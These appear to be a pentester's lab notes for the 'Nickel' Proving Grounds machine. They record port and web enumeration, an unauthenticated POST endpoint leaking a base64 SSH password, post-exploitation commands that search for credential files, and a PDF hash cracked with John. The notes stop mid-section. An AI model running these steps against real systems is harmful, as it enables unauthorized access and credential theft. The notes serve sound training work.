
**Metadata**

- IP Address:  192.168.162.99
- Hostname: Nickel
- OS:  Windows 10.0.18362
- Found Credentials/Users:
		ariah/NowiseSloopTheory139
		ariah/
-
Main Objectives:

Local.txt = 
Proof.txt = 

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.238.99 -oN - 
# Nmap 7.95 scan initiated Sun Jan  4 14:57:43 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.238.99
Nmap scan report for 192.168.238.99
Host is up (0.081s latency).
Not shown: 986 closed tcp ports (reset), 7 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8089/tcp open  unknown

[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.238.99 -oN /home/kali/ProvingGround/Nickel/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Nickel/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-04 14:57 MST
Nmap scan report for 192.168.238.99
Host is up (0.080s latency).
Not shown: 64489 closed tcp ports (reset), 1030 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

[+] Running: Nmap MEDIUM UDP (top 1000 + bounded)
[+] Command: nmap -sU -Pn -n --top-ports 1000 -T4 --open -sV --version-intensity 5 --max-retries 1 --host-timeout 20m 192.168.238.99 -oN /home/kali/ProvingGround/Nickel/nmap/medium_udp.nmap -oG /home/kali/ProvingGround/Nickel/nmap/medium_udp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-04 15:07 MST
Warning: 192.168.238.99 giving up on port because retransmission cap hit (1).
Nmap scan report for 192.168.238.99
Host is up (0.11s latency).
Skipping host 192.168.238.99 due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1204.44 seconds


```

2. Interesting Ports/Services

```
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

3. FTP Enumeration

```
FTP (21/tcp) Enumeration & Exploitation – OSCP Cheat Sheet

Metadata
Service: FTP
Version: FileZilla ftpd 0.9.60 beta

1. Initial Detection

nmap -p 21 -sS --open <IP>

Confirm FTP is open and responding.

21/tcp    open   ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
---

2. Banner & Version Enumeration

nc <IP> 21

nmap -p 21 -sV <IP>

Look for:

* FTP server type (vsftpd, ProFTPD, Pure-FTPd, FileZilla)
* Exact version numbers
* Anonymous login hints

---

3. Anonymous Login Test (ALWAYS)

ftp 192.168.238.99
Connected to 192.168.238.99.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (192.168.238.99:kali): anonymous
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
ftp> 


After login:

ls
pwd
cd /
cd pub
binary
passive

---

4. Anonymous Upload Test

Create a test file:

echo test > test.txt

Upload:

put test.txt

If upload succeeds:

* Check if directory maps to web root
* Attempt webshell upload
* Look for cron/script abuse

---

5. Download Everything (Loot First)

From local machine:

wget -r ftp://anonymous:anonymous@<IP>/

From ftp client:

prompt
mget *

Look for:

* Credentials
* .bak / .old / .zip / .tar.gz
* Source code

```

4. Web Enumeration (Port 8089)

```
Site Visit: 
curl -i http://192.168.238.99:8089                                                   
HTTP/1.1 200 OK
Content-Length: 468
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 05 Jan 2026 23:20:04 GMT

<h1>DevOps Dashboard</h1>
<hr>
<form action='http://169.254.1.128:33333/list-current-deployments' method='GET'>
<input type='submit' value='List Current Deployments'>
</form>
<br>
<form action='http://169.254.1.128:33333/list-running-procs' method='GET'>
<input type='submit' value='List Running Processes'>
</form>
<br>
<form action='http://169.254.1.128:33333/list-active-nodes' method='GET'>
<input type='submit' value='List Active Nodes'>
</form>
<hr>   

8089/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.

nikto -h 192.168.238.99:8089
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.238.99
+ Target Hostname:    192.168.238.99
+ Target Port:        8089
+ Start Time:         2026-01-04 15:24:13 (GMT-7)
---------------------------------------------------------------------------
+ Server: Microsoft-HTTPAPI/2.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated: 20 error(s) and 2 item(s) reported on remote host
+ End Time:           2026-01-04 15:40:20 (GMT-7) (967 seconds)
-----------------

[+] Running: Gobuster BASIC (8089) (exclude-length 9)
[+] Command: gobuster dir -u http://192.168.238.99:8089 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Nickel/gobuster/Nickel_192.168.238.99_8089_dir_basic.txt --exclude-length 9 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.238.99:8089
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          9
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================


[+] Running: Gobuster ADVANCED (8089) (exclude-length 9)
[+] Command: gobuster dir -u http://192.168.238.99:8089 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Nickel/gobuster/Nickel_192.168.238.99_8089_dir_advanced.txt --exclude-length 9 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.238.99:8089
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          9
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================

[+] Running: Gobuster FILE search (8089) (exclude-length 9)
[+] Command: gobuster dir -u http://192.168.238.99:8089 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Nickel/gobuster/Nickel_192.168.238.99_8089_files.txt --exclude-length 9 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.238.99:8089
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          9
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,bak,aspx,jsp,old,zip,tar,tar.gz,php,asp,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 55356 / 55356 (100.00%)
===============================================================
Finished
===============================================================


```

5. Web Enumeration (Port 33333)

```
Site Visit: 

curl -i http://192.168.238.99:33333                                                  
HTTP/1.1 200 OK
Content-Length: 13
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 05 Jan 2026 23:20:37 GMT

Invalid Token 

33333/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0

 nikto -h 192.168.238.99:33333  
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.238.99
+ Target Hostname:    192.168.238.99
+ Target Port:        33333
+ Start Time:         2026-01-04 15:23:07 (GMT-7)
---------------------------------------------------------------------------
+ Server: Microsoft-HTTPAPI/2.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 8120 requests: 13 error(s) and 2 item(s) reported on remote host
+ End Time:           2026-01-04 15:38:45 (GMT-7) (938 seconds)
--------------------

[+] Running: Gobuster BASIC (33333) (exclude-length 16)
[+] Command: gobuster dir -u http://192.168.238.99:33333 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Nickel/gobuster/Nickel_192.168.238.99_33333_dir_basic.txt --exclude-length 16 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.238.99:33333
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          16
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

[+] Running: Gobuster ADVANCED (33333) (exclude-length 16)
[+] Command: gobuster dir -u http://192.168.238.99:33333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Nickel/gobuster/Nickel_192.168.238.99_33333_dir_advanced.txt --exclude-length 16 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.238.99:33333
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          16
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================

[+] Running: Gobuster FILE search (33333) (exclude-length 16)
[+] Command: gobuster dir -u http://192.168.238.99:33333 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Nickel/gobuster/Nickel_192.168.238.99_33333_files.txt --exclude-length 16 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.238.99:33333
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          16
[+] User Agent:              gobuster/3.8
[+] Extensions:              zip,php,aspx,html,txt,bak,old,tar,tar.gz,asp,jsp
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 55356 / 55356 (100.00%)
===============================================================
Finished
===============================================================


```


6. SMB Port 139, 445 Enumeration

```
smbclient -L //192.168.238.99 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE

smbmap -H 192.168.238.99                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[/] Authenticating...                                                     [-] Enumerating shares...                                                 [\] Enumerating shares...                                                 [!] Something weird happened on (192.168.238.99) Error occurs while reading from remote(104) on line 1015


```

7. Port 7680

```
7680/tcp  closed pando-pub

||TCP port 7680 is used by WUDO (Windows Update Delivery Optimization) to distribute updates in Windows LANs.  <br>  <br>IANA registered for: Pando Media Public Distribution|
```

8. Port 3389

```
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2026-01-04T22:29:55+00:00
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2025-12-06T11:11:21
|_Not valid after:  2026-06-07T11:11:21
|_ssl-date: 2026-01-04T22:31:01+00:00; 0s from scanner time.
```
8. Possible Exploits

```
<form action='http://169.254.1.128:33333/list-current-deployments' method='GET'>
<input type='submit' value='List Current Deployments'>
</form>
<br>
<form action='http://169.254.1.128:33333/list-running-procs' method='GET'>
<input type='submit' value='List Running Processes'>
</form>
<br>
<form action='http://169.254.1.128:33333/list-active-nodes' method='GET'>
<input type='submit' value='List Active Nodes'>
</form>
<hr>  
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

```
1. curl -i http://192.168.238.99:33333/list-running-procs                               
HTTP/1.1 200 OK
Content-Length: 39
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 05 Jan 2026 23:22:05 GMT

<p>Cannot "GET" /list-running-procs</p>  

2. curl -i http://192.168.238.99:33333/list-running-procs -X POST                       
HTTP/1.1 411 Length Required
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 05 Jan 2026 23:22:32 GMT
Connection: close
Content-Length: 344

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Length Required</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Length Required</h2>
<hr><p>HTTP Error 411. The request must be chunked or have a content length.</p>
</BODY></HTML>

3. curl -i http://192.168.238.99:33333/list-running-procs -X POST -H 'Content-Length: 0'
HTTP/1.1 200 OK
Content-Length: 2916
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 05 Jan 2026 23:22:54 GMT 

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

3. Attempted logon with ariah/Tm93aXNlU2xvb3BUaGVvcnkxMzkK
   Failed
4. Put Tm93aXNlU2xvb3BUaGVvcnkxMzkK into cyber chef to see if it was encoded. Base64 decode is NowiseSloopTheory139. 



```

2. Shell Access

```

```

**Post-Exploitation**

1. Basic System Info

```
#CMD
whoami
nickel\ariah

whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

whoami /groups
GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes

====================================== ================ ============ ===============================================
===
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled gr
oup
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled gr
oup
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled gr
oup
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled gr
oup
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled gr
oup
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled gr
oup
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled gr
oup
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192

hostname
nickel

systeminfo
ERROR: Access denied

ver
Microsoft Windows [Version 10.0.18362.1016]

echo %USERNAME%
echo %COMPUTERNAME%
echo %USERDOMAIN%
set
wmic os get Caption,Version,BuildNumber,OSArchitecture
wmic computersystem get Model,Manufacturer,SystemType
wmic qfe get HotFixID,InstalledOn

#Powershell
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
Get-ComputerInfo
Get-WmiObject Win32_OperatingSystem
Get-WmiObject Win32_ComputerSystem
Get-HotFix

```

2. User Enumeration

```
#CMD
net user
User accounts for \\NICKEL

-------------------------------------------------------------------------------
Administrator            ariah                    DefaultAccount
Guest                    WDAGUtilityAccount

net user <username>
net localgroup
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*ssh
*System Managed Accounts Group
*Users
The command completed successfully.

net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

--------------------

query us

#Powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-ADUser -Filter *    (domain joined)
Get-ADGroup -Filter *
Get-ADGroupMember "Domain Admins"
whoami /all


```

3. Network Information

```
#CMD
ipconfig /all
Windows IP Configuration

   Host Name . . . . . . . . . . . . : nickel
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-86-8A-11
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.238.99(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.238.254
   DNS Servers . . . . . . . . . . . : 192.168.238.254
   NetBIOS over Tcpip. . . . . . . . : Enabled

arp -a
route print
Interface List
  4...00 50 56 86 8a 11 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.238.254   192.168.238.99     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.238.0    255.255.255.0         On-link    192.168.238.99    271
   192.168.238.99  255.255.255.255         On-link    192.168.238.99    271
  192.168.238.255  255.255.255.255         On-link    192.168.238.99    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    192.168.238.99    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    192.168.238.99    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.238.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

netstat -ano
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1904
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       1984
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1012
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:8089           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:33333          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       520
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       356
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1004
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       612
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1812
  TCP    127.0.0.1:80           0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       1904
  TCP    192.168.238.99:22      192.168.45.231:52992   ESTABLISHED     1984
  TCP    192.168.238.99:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.238.99:49731   20.42.73.31:443        TIME_WAIT       0
  TCP    192.168.238.99:49742   20.189.173.10:443      ESTABLISHED     1880
  TCP    192.168.238.99:49744   199.232.214.172:80     SYN_SENT        1172
  TCP    192.168.238.99:49745   135.234.160.244:443    SYN_SENT        4672
  TCP    192.168.238.99:49746   135.232.92.137:443     SYN_SENT        1004
  TCP    192.168.238.99:49747   135.234.160.244:443    SYN_SENT        4844
  TCP    192.168.238.99:49748   199.232.214.172:80     SYN_SENT        1880

net use
There are no entries in the list.

net share
Access is denied.

net session
Access is denied.

nltest /domain_trusts
nltest /dsgetdc:<domain>

#Powershell
Get-NetIPConfiguration
Get-NetIPAddress
Get-NetRoute
Get-NetTCPConnection
Get-SmbShare
Get-SmbSession
Resolve-DnsName <hostname>
```

4. Software, Service, and Process Information

```
#CMD
wmic product get name,version
ERROR:
Description = Access denied

wmic product where "Vendor like '%Microsoft%'" get Name,Version
dir "C:\Program Files"
Directory of C:\Program Files

04/14/2022  04:22 AM    <DIR>          .
04/14/2022  04:22 AM    <DIR>          ..
09/01/2020  05:35 PM    <DIR>          Common Files
04/14/2022  03:57 AM    <DIR>          Internet Explorer
04/14/2022  03:47 AM    <DIR>          Microsoft
09/01/2020  10:47 AM    <DIR>          Microsoft Update Health Tools
03/18/2019  08:52 PM    <DIR>          ModifiableWindowsApps
09/01/2020  11:38 AM    <DIR>          OpenSSH
10/16/2020  05:11 AM    <DIR>          UNP
04/14/2022  04:22 AM    <DIR>          VMware
09/01/2020  11:04 AM    <DIR>          Windows Defender
09/01/2020  11:04 AM    <DIR>          Windows Defender Advanced Threat Protection
09/01/2020  11:04 AM    <DIR>          Windows Mail
09/01/2020  11:04 AM    <DIR>          Windows Media Player
03/18/2019  10:23 PM    <DIR>          Windows Multimedia Platform
03/18/2019  09:02 PM    <DIR>          Windows NT
09/01/2020  11:04 AM    <DIR>          Windows Photo Viewer
03/18/2019  10:23 PM    <DIR>          Windows Portable Devices
03/18/2019  08:52 PM    <DIR>          Windows Security
03/18/2019  08:52 PM    <DIR>          WindowsPowerShell

dir "C:\Program Files (x86)"
Directory of C:\Program Files (x86)

04/14/2022  03:43 AM    <DIR>          .
04/14/2022  03:43 AM    <DIR>          ..
03/18/2019  09:02 PM    <DIR>          Common Files
09/01/2020  11:38 AM    <DIR>          FileZilla Server
04/14/2022  03:57 AM    <DIR>          Internet Explorer
04/14/2022  03:45 AM    <DIR>          Microsoft
03/18/2019  08:52 PM    <DIR>          Microsoft.NET
03/18/2019  10:20 PM    <DIR>          Windows Defender
09/01/2020  11:04 AM    <DIR>          Windows Mail
09/01/2020  11:04 AM    <DIR>          Windows Media Player
03/18/2019  10:23 PM    <DIR>          Windows Multimedia Platform
03/18/2019  09:02 PM    <DIR>          Windows NT
09/01/2020  11:04 AM    <DIR>          Windows Photo Viewer
03/18/2019  10:23 PM    <DIR>          Windows Portable Devices
03/18/2019  08:52 PM    <DIR>          WindowsPowerShell

sc query
Access is denied.

sc qc <service_name>

wmic service list brief
Access is denied.

wmic service get name,displayname,pathname,startmode

tasklist
Access is denied.

tasklist /v
Access is denied.

tasklist /svc
Access is denied.

wmic process list brief
Access is denied.

#Powershell
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
DisplayName     : FileZilla Server
DisplayIcon     : C:\Program Files (x86)\FileZilla Server\FileZilla server.exe
DisplayVersion  : beta 0.9.60
HelpLink        : https://filezilla-project.org/
InstallLocation : C:\Program Files (x86)\FileZilla Server
URLInfoAbout    : https://filezilla-project.org/
URLUpdateInfo   : https://filezilla-project.org/
UninstallString : C:\Program Files (x86)\FileZilla Server\uninstall.exe
Publisher       : FileZilla Project

Get-Package
Name                           Version          Source                           ProviderName                      
----                           -------          ------                           ------------
Microsoft Visual C++ 2019 X... 14.27.29016                                       msi
Microsoft Visual C++ 2019 X... 14.27.29016                                       msi
Microsoft Visual C++ 2019 X... 14.27.29016                                       msi
VMware Tools                   11.2.6.17901274  C:\Program Files\VMware\VMwar... msi
Microsoft Update Health Tools  2.65.0.0                                          msi
Microsoft Visual C++ 2019 X... 14.27.29016                                       msi
FileZilla Server               beta 0.9.60                                       Programs
Microsoft Edge                 100.0.1185.39                                     Programs
Microsoft Edge Update          1.3.157.61                                        Programs
Microsoft Visual C++ 2015-2... 14.27.29016.0                                     Programs
Microsoft Visual C++ 2015-2... 14.27.29016.0                                     Programs

Get-Service
Get-WmiObject Win32_Service | Select Name,StartMode,State,PathName
Get-Service | Where-Object {$_.Status -eq "Running"}

Get-Process
Get-Process -IncludeUserName
Get-WmiObject Win32_Process | Select Name,ProcessId,ExecutablePath

```

4. Loot files.
```
# CMD
dir C:\



dir C:\Users
Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/14/2022   4:51 AM                Administrator
d-----       10/15/2020   7:23 AM                ariah
d-r---         9/1/2020   6:28 PM                Public

dir C:\Users\ariah\Desktop
Directory: C:\Users\ariah\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/5/2026   5:39 PM             34 local.txt

dir C:\Users\ariah\Documents
Directory: C:\Users\ariah\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/5/2026   5:51 PM                WindowsPowerShell

dir C:\Users\ariah\Downloads
dir C:\Users\ariah\AppData\Roaming
Directory: C:\Users\ariah\AppData\Roaming


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/15/2020   7:23 AM                Adobe
d---s-       10/15/2020   7:23 AM                Microsoft

dir C:\Users\ariah\AppData\Local
Directory: C:\Users\ariah\AppData\Local


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/15/2020   7:24 AM                ConnectedDevicesPlatform
d-----       10/15/2020   7:25 AM                Microsoft
d-----       10/15/2020   7:24 AM                MicrosoftEdge
d-----         1/5/2026   5:51 PM                PackageManagement
d-----       10/15/2020   7:25 AM                Packages
d-----       10/15/2020   7:24 AM                Publishers
d-----         1/5/2026   5:51 PM                Temp
d-----       10/15/2020   7:23 AM                VirtualStore

dir C:\inetpub\wwwroot
dir C:\xampp
dir C:\wamp

dir /s /b *.txt *.ini *.cfg *.conf *.xml *.log *.bak *.ps1 *.kdbx *.rdp *.ppk *.pem

#Powershell
Get-ChildItem C:\Users -Recurse -Include *.txt,*.ini,*.cfg,*.xml,*.kdbx -ErrorAction SilentlyContinue
Directory: C:\Users\ariah\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/5/2026   5:39 PM             34 local.txt

Get-ChildItem C:\ -Recurse -Include *pass*,*cred*,*secret* -ErrorAction SilentlyContinue



```

5. Automated Enumeration

```

1. PS history file: C:\Users\ariah\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 


```
5. Possible PE Paths

```
1. C:\ftp\Infrastrcuture.pdf
   
   scp ariah@192.168.238.99:C:/ftp/Infrastructure.pdf .
   sudo pdf2john Infrastructure.pdf > hash
   john --wordlist=/usr/share/wordlists/rockyou.txt hash --rules=sshrules  
   ariah4168
   
   Infrastructure Notes
